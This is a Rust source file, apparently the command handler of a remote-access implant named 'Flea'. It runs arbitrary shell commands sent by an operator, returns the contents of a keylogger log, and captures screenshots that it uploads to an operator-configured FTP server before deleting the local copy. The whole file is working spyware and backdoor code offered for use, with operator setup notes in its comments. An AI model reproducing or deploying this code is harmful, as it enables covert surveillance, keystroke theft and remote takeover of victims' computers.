extern crate ftp;
extern crate repng;
extern crate serde;

use serde::{Serialize, Deserialize};
use std::process::Stdio;
use execute::{Execute, command};
use ftp::{FtpError, FtpStream};
use std::{io::Cursor, str, fs::File, io::Read, env, thread, io::ErrorKind::WouldBlock};
use std::path::PathBuf;
use scrap::{Capturer, Display};
use std::time::Duration;
use log::{debug, error};
use chrono::{DateTime, Utc};
use crate::keylogger::*;

const FLEA_PROTOCOL_VERSION: u8 = 1;
const GET_VERSION_COMMAND: &'static str = "version";
const EXECUTE_BASH_COMMAND: &'static str = "bash";
const SEND_PIC_COMMAND: &'static str = "pic";
const SEND_KEY_LOGGER_FILE_COMMAND: &'static str = "sendlog";
const UNKNOWN_COMMAND: &'static str = "Unknown command";

//Enter your data for FTP Server connection
const FTP_USER_NAME: &'static str = "enter_ftp_user_name";
const FTP_PASS_NAME: &'static str = "enter_ftp_user_password";
const FTP_ADDRESS_NAME: &'static str = "enter_ftp_server_ip_address";
const FTP_FOLDER_NAME: &'static str = "enter_ftp_folder_name";

pub trait FleaCommand
{
    fn new() -> Self;
    fn process(&self, cmd: &str, value: &str) -> String;
}

#[derive(Serialize, Deserialize)]
struct FleaConfig 
{
    ftp_user: String,
    ftp_pass: String,
    ftp_address: String,
    ftp_folder: String,
}

pub struct CommandProcessor
{
    version: u8,
    current_directory: PathBuf,
    conf: FleaConfig,
}

/* Default values will be saved in a Flea configuration file when the file not exists.
    After that you should modify the file to set up your own values or enter your values
    in the constants defined above*/
impl ::std::default::Default for FleaConfig 
{
    fn default() -> Self 
    { 
        Self 
        { 
            ftp_address: FTP_ADDRESS_NAME.into(), 
            ftp_pass: FTP_PASS_NAME.into(), 
            ftp_user: FTP_USER_NAME.into(),
            ftp_folder: FTP_FOLDER_NAME.into()
        } 
    }
}

impl CommandProcessor
{
    /// Executes a command line in the current OS
    /// and returns output to the caller as a string
    /// * value - a command line to execute
    fn execute_bash_command(&self, value: &str) -> String
    {
        debug!("Executing bash command:{}", &value);

        let mut command = command(value);

        command.stdout(Stdio::piped());
        
        let output = match command.execute_output()
        {
            Ok(x) =>
            {
                x
            },
            Err(y) =>
            {
                return y.to_string()
            }
        };
        
        String::from_utf8(output.stdout).unwrap()
    }

    /// Takes screenshot and save it as a PNG file in a passed file
    /// * file_path - a path with a filename to store the screenshot
    fn take_screenshot(&self, file_path: &str) -> Result<(), String>
    {
        let one_second = Duration::new(1, 0);
        let one_frame = one_second / 60;
    
        let display = match Display::primary()
        {
            Ok(x) =>
            {
                x
            },
            Err(y) =>
            {
                error!("{}", y.to_string());
                return Err(y.to_string())
            }
        };

        let mut capturer = match Capturer::new(display)
        {
            Ok(x) =>
            {
                x
            },
            Err(y) =>
            {
                error!("{}", y.to_string());
                return Err(y.to_string())
            }
        };

        let (w, h) = (capturer.width(), capturer.height());
    
        loop 
        {
            // Wait until there's a frame.
    
            let buffer = match capturer.frame() 
            {
                Ok(buffer) => buffer,
                Err(error) => 
                {
                    if error.kind() == WouldBlock 
                    {
                        // Keep spinning.
                        thread::sleep(one_frame);
                        continue;
                    } 
                    else 
                    {
                        let e = std::io::Error::new(std::io::ErrorKind::Other, "Exception while sleeping in thread");
                        error!("{}", e.to_string());
                        return Err(e.to_string());
                    }
                }
            };
    
            debug!("Screen captured! Saving...");
    
            // Flip the ARGB image into a BGRA image.
    
            let mut bitflipped = Vec::with_capacity(w * h * 4);
            let stride = buffer.len() / h;
    
            for y in 0..h 
            {
                for x in 0..w 
                {
                    let i = stride * y + 4 * x;
                    bitflipped.extend_from_slice(&[
                        buffer[i + 2],
                        buffer[i + 1],
                        buffer[i],
                        255,
                    ]);
                }
            }
    
            // Save the image.
    
            match repng::encode(
                File::create(file_path).unwrap(),
                w as u32,
                h as u32,
                &bitflipped,)
                {
                    Ok(_) =>
                    {
                        ()
                    },
                    Err(x) =>
                    {
                        error!("{}", x.to_string());
                        return Err(x.to_string());
                    }
                }
    
            debug!("Image saved.");
            break;
        }

        Ok(())
    }

    /// Reads a file and store its content in a vec
    /// * file_path - a file with the absolute path to read from
    fn read_file_to_vec(&self, file_path: &str) -> std::io::Result<Vec<u8>> 
    {
        let mut file = File::open(&file_path)?;
    
        let mut data = Vec::new();
        file.read_to_end(&mut data)?;
    
        return Ok(data);
    }
    
    /// Sends a file to a remote FTP server
    /// * addr - an FTP server address
    /// * user - login name
    /// * pass - password
    /// * file_path - a path to the file to be sent
    fn send_file_to_ftp(&self, addr: &str, user: &str, pass: &str, file_path: &PathBuf) -> Result<(), FtpError>
    {
        const FTP_STD_PORT: u16 = 21;

        let mut ftp_stream = FtpStream::connect((addr, FTP_STD_PORT))?;

        ftp_stream.login(user, pass)?;
    
        debug!("Connected to FTP server.");

        ftp_stream.cwd(&self.conf.ftp_folder)?;

        // Store a file
        match self.read_file_to_vec(file_path.to_str().unwrap())
        {
            Ok(file_data) =>
            {
                let mut reader = Cursor::new(file_data);
                ftp_stream.put(file_path.file_name().unwrap().to_str().unwrap(), &mut reader)?;
                debug!("File uploaded to FTP server.")
            },
            Err(x) =>
            {
                error!("Couldn't upload the file to FTP server:{}", x.to_string());                
                ftp_stream.quit()?;
                return Err(FtpError::InvalidResponse(x.to_string()))
            }
        };

        ftp_stream.quit()
    }
}

impl FleaCommand for CommandProcessor
{
    fn new() -> Self
    {
        debug!("Creating FleaCommand..");

        Self 
        { 
            version: FLEA_PROTOCOL_VERSION,

            conf: match confy::load("flea_conf")
            {
                Ok(x) =>
                {
                    x
                },
                Err(e) =>
                {
                    panic!("Configuration error {}", e.to_string())
                }
            },
            
            current_directory: match env::current_dir() 
            {
                Ok(x) =>
                {
                    x
                },
                Err(y) =>
                {
                    panic!("Couldn't get current directory: {}", y.to_string())
                }
            }
        }
    }

    /// A routine for processing incoming commands
    /// * cmd - a command in a form of a string
    /// * value - an additional data related to a command
    fn process(&self, cmd: &str, value: &str) -> String
    {        
        match cmd
        {
            GET_VERSION_COMMAND =>
            {
                return self.version.to_string();
            },

            EXECUTE_BASH_COMMAND =>
            {
                return self.execute_bash_command(value);
            },

            SEND_KEY_LOGGER_FILE_COMMAND =>
            {
                let current_path = self.current_directory.join(KEY_LOGGER_FILE_NAME).to_str().unwrap().to_string();
                return get_key_logger_content(&current_path);
            },

            SEND_PIC_COMMAND =>
            {
                let now: DateTime<Utc> = Utc::now();
                let file_name = format!("screenshot{}.png", now.format("%Y-%m-%d_%H-%M-%S"));
                let current_path = env::temp_dir().as_path().join(file_name);

                match self.take_screenshot(&current_path.to_str().unwrap()) 
                {
                    Ok(x) =>
                    {
                        x
                    },
                    Err(x) =>
                    {
                        return x
                    }
                };

                return match self.send_file_to_ftp(&self.conf.ftp_address, &self.conf.ftp_user, &self.conf.ftp_pass, &current_path)
                {
                    Ok(_) =>
                    {
                        match std::fs::remove_file(current_path)
                        {
                            Ok(_) =>
                            {
                                debug!("A temporary file removed.");
                            },
                            Err(_) =>
                            {
                                error!("Couldn't remove a temp file!");
                            }
                        }

                        "Ok".to_string()
                    },
                    Err(x) =>
                    {
                        x.to_string()
                    }
                }    
            },

            &_ =>
            {

            }
        }

        UNKNOWN_COMMAND.to_string()
    }
}

#[cfg(test)]
mod tests 
{
    use super::*;

    #[test]    
    fn process_test()
    {
        let p: CommandProcessor = FleaCommand::new();
        let ret = p.process(GET_VERSION_COMMAND, "");
        assert!(ret == p.version.to_string());

        let ret = p.process("unknown command", "");
        assert!(ret == UNKNOWN_COMMAND.to_string());

        let ret = p.process(EXECUTE_BASH_COMMAND, "echo test");
        assert!(ret.len() > 0);
    }
}